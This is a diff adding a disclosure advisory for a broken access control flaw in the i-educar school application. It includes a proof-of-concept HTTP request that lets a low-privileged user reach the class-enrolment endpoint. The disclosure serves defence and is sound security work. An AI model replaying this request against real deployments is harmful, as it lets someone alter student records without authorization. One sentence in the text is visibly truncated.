@@ -1,0 +1,75 @@
+# Broken Access Control  in /matricula/[ID_STUDENT]/enturmar/[ID_CLASS]` Endpoint
+
+---
+
+## Summary
+
+A **Broken Access Control** vulnerability was identified in the `/matricula/[ID_STUDENT]/enturmar/[ID_CLASS]` endpoint of the _i-educar_ application. This vulnerability allows users without proper permissions to access restricted functionality, bypassing authorization checks.
+
+---
+
+## Details
+
+**Vulnerable Endpoint:** `GET /matricula/[ID_STUDENT]/enturmar/[ID_CLASS]`  
+**Authentication:** Required
+
+The application fails to properly validate user permissions before granting access to this endpoint. As a result, even low-privileged users can successfully access the functionality intended only for .
+
+---
+
+## PoC
+
+1. Authenticate as a non-privileged user.
+
+<img width="1843" height="533" alt="Pasted image 20250821190942" src="https://github.com/user-attachments/assets/528a5b22-4d98-4ad3-b6fe-357a4fffbf62" />
+<img width="936" height="436" alt="Pasted image 20250821191019" src="https://github.com/user-attachments/assets/5b190516-6229-4261-86f6-9be742934f86" />
+
+    
+2. Send the following request::
+
+```
+GET /matricula/206/enturmar/23 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Connection: keep-alive
+Referer: http://localhost/intranet/educar_matricula_turma_lst.php?ref_cod_matricula=206&ano_letivo=2025
+Cookie: i_educar_session=Mz9IKWGOP641g4BLkSGRnxs69wk4ChmUUxUerX19
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+```
+    
+3. We could observe that we have access to the page and to the function to sign students from classes. And, this user, should not do that.
+
+<img width="1555" height="666" alt="Pasted image 20250821222850" src="https://github.com/user-attachments/assets/384c88a6-b2b6-4a0f-b27c-19ab4c75548a" />
+
+
+---
+
+## Impact
+
+Broken Access Control vulnerabilities can have severe consequences, including:
+
+- Unauthorized access to restricted functionality
+    
+- Escalation of privileges for low-level users
+    
+- Exposure of sensitive data and potential system compromise
+    
+- Loss of confidentiality and integrity of educational records
+    
+- Reputational damage to the organization
+    
+---
+
+## Discoverer
+
+[Marcelo Queiroz](www.linkedin.com/in/marceloqueirozjr)
+
+by [CVE-Hunters](https://github.com/Sec-Dojo-Cyber-House/cve-hunters)
